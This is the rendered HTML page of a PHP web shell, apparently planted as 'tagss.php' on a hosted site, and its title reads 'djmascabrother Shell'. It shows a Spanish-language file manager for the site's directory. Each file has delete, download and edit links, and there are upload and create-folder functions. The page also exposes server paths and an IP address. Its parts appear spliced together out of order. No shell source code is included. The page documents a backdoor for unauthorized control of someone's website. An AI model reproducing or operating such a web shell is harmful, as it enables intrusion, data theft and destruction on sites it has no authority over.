                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">registro-notificacion.php</a></td>
                    <td>Archivo</td>
                    <td>303 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">registro2.php</a></td>
                    <td>Archivo</td>
                    <td>4.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro2.php::registro2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">registrooff.php</a></td>
                    <td>Archivo</td>
                    <td>21.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registrooff.php::registrooff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registrooff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">salir.php</a></td>
                    <td>Archivo</td>
                    <td>299 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/salir.php::salir.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::salir.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">session.php</a></td>
                    <td>Archivo</td>
                    <td>1.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/session.php::session.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::session.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">staff.php</a></td>
                    <td>Archivo</td>
                    <td>4.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/staff.php::staff.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::staff.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">tagcloud.php</a></td>
                    <td>Archivo</td>
                    <td>10.53 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagcloud.php::tagcloud.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagcloud.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">tagss.php</a></td>
                    <td>Archivo</td>
                    <td>50.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/tagss.php::tagss.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::tagss.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">terminos-y-condiciones.php</a></td>
                    <td>Archivo</td>
                    <td>34.16 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/terminos-y-condiciones.php::terminos-y-condiciones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::terminos-y-condiciones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">top.php</a></td>
                    <td>Archivo</td>
                    <td>32.88 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/top.php::top.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::top.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">trabajo.php</a></td>
                    <td>Archivo</td>
                    <td>3.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/trabajo.php::trabajo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::trabajo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">ultimos_comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>899 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ultimos_comentarios.php::ultimos_comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ultimos_comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">usuarios.php</a></td>
                    <td>Archivo</td>
                    <td>21.93 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/usuarios.php::usuarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::usuarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">votar.php</a></td>
                    <td>Archivo</td>
                    <td>2.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/votar.php::votar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::votar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">x.php</a></td>
                    <td>Archivo</td>
                    <td>10.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/x.php::x.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::x.php">Editar</a>
                    </td>
                    </tr></table><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="shortcut icon" href="http://skynetx.cz.cc/tagss.php?imagen::icono" />
    <title>djmascabrother Shell en 209.190.85.12</title>
    <style type="text/css">
        *{padding:0;margin:0;border:0;}
        body{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo1) repeat;font-size:12px;font-family:tahoma;}
        input,select,option{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo2) repeat-x;font-size:12px;padding:3px;border:solid 1px #369;}
        select,option{height:25px;padding:-2px;border:solid 1px #369;}
        option{border:solid 1px #eee;}
        #menu,#pie,#ext_menu{width:100%;border-bottom:solid 1px #369;background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo2) repeat-x;height:14px;padding:8px 0;text-align:center;}
        #menu a:link,#menu a:visited,#menu a:active,#pie a:link,#pie a:visited,#pie a:active,#pie span,#ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{text-decoration:none;font-weight:bold;color:#369;padding:3px 10px 3px 28px;background-position:2px 2px;}
        #menu a:hover,#pie a:hover,#ext a:hover{padding:1px 9px 1px 27px;border:solid 1px #ddd;background-position:1px 0px;color:#333;}
        #ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{padding:3px 28px 3px 28px;}
        #ext_menu a:hover{padding:1px 27px 1px 27px;border:solid 1px #c90;}
        #pie{border-top:solid 1px #369;}
        #pie input{background:url(http://skynetx.cz.cc/tagss.php?imagen::nombre) 4px 2px no-repeat;padding-left:24px;border:solid 1px #ddd;margin:-4px 10px;width:200px;color:#369;font-weight:bold;}
        #ext_menu{background:url(http://skynetx.cz.cc/tagss.php?imagen::fondo3) repeat-x;}
        #menu_logo,#pie_logo{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin2) 0px 10px no-repeat;float:left;width:48px;height:40px;display:block;z-index:999;margin-top:-18px;}
        #pie_logo{background:url(http://skynetx.cz.cc/tagss.php?imagen::servidor2) 4px 10px no-repeat;margin-bottom:-18px;overflow:hidden;display:fixed;z-index:999;}
        #guardar{background:url(http://skynetx.cz.cc/tagss.php?imagen::guardar) left no-repeat;}
        #resetear{background:url(http://skynetx.cz.cc/tagss.php?imagen::resetear) left no-repeat;}
        a#inicio{background:url(http://skynetx.cz.cc/tagss.php?imagen::inicio) left no-repeat;}
        a#subir_archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::subir) left no-repeat;}
        a#crear_carpeta{background:url(http://skynetx.cz.cc/tagss.php?imagen::carpeta) left no-repeat;}
        a#crear_archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::archivo) left no-repeat;}
        a#borrar{background:url(http://skynetx.cz.cc/tagss.php?imagen::error) left no-repeat;}
        a#descargar{background:url(http://skynetx.cz.cc/tagss.php?imagen::bajar) left no-repeat;}
        a#editar{background:url(http://skynetx.cz.cc/tagss.php?imagen::editar) left no-repeat;}
        a#mysql{background:url(http://skynetx.cz.cc/tagss.php?imagen::mysql) left no-repeat;}
        a#info{background:url(http://skynetx.cz.cc/tagss.php?imagen::info) left no-repeat;}
        a#servidor{background:url(http://skynetx.cz.cc/tagss.php?imagen::servidor) left no-repeat;}
        a#extensiones{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin) left no-repeat;}
        span#carga{background:url(http://skynetx.cz.cc/tagss.php?imagen::engranaje) left no-repeat;}
        table{margin:0;padding:0;width:100%;border-bottom:solid 1px #369;background:white;border-collapse: collapse;}
        table td{border:solid 1px #eee;color:#555;padding:2px 4px 2px 10px;}
        table tr:hover{background:#eee;}
        textarea{border:none;width:100%;height:500px;overflow:auto;}
        form span {color:#444;font-weight:bold;}
        .opciones{width:350px;}
        .ext_opciones{width:250px;}
        .opciones a:link,.opciones a:visited,.opciones a:active, .ext_opciones a:link,.ext_opciones a:visited,.ext_opciones a:active{padding:2px 18px;text-decoration:none;font-weight:bold;color:#369;background-position:2px 2px;font-size:10px;}
        .opciones a:hover, .ext_opciones a:hover{padding:-5px 9px;background-position:1px 1px;color:#black;}
        .primer_fila{padding-left:10px;font-weight:bold;color:#369;border:solid 1px #369;background:lightblue;}
        .permisos{color:#aaa;}
        .si_permisos{color:green;}
        .no_permisos{color:red;}
        .archivo{background:url(http://skynetx.cz.cc/tagss.php?imagen::archivo) center no-repeat;width:18px;height:18px;}
        .carpeta{background:url(http://skynetx.cz.cc/tagss.php?imagen::carpeta) center no-repeat;width:18px;height:18px;}
        .enlace{background:url(http://skynetx.cz.cc/tagss.php?imagen::enlace) center no-repeat;width:18px;height:18px;}
        .extension{background:url(http://skynetx.cz.cc/tagss.php?imagen::plugin) center no-repeat;width:18px;height:18px;}
        .contenedor,.error,.exito{width:100%;border-bottom:solid 1px #369;background:white;padding:5px 10px;text-align:center;}
        .error{background:#f66;color:white;font-weight:bold;}
        .exito{background:#0c9;color:white;font-weight:bold;}
    </style>
</head>

<body>
<div id="menu">
    <a id="inicio" href="http://skynetx.cz.cc/tagss.php">Inicio</a>
    <a id="subir_archivo" href="?subir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Subir archivo</a>
    <a id="crear_carpeta" href="?crear_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Crear carpeta</a>
    <a id="extensiones" href="?extensiones::inicio">Extensiones</a>
    <a id="info" href="?codigo"></a>
    </div><div id="ext_menu">
            <div id="menu_logo"></div><span> No hay ninguna extensión instalada aún.</span></div><table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin">admin</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades">comunidades</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta">cuenta</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images">images</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes">includes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab">lab</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes">mensajes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones">notificaciones</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha">recaptcha</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss">rss</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search">search</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads">socialads</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>3.81 KB</td>
                    <td><span class="si_permisos">rw-r--r--</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>7.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">agregar.form.php</a></td>
                    <td>Archivo</td>
                    <td>12.8 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
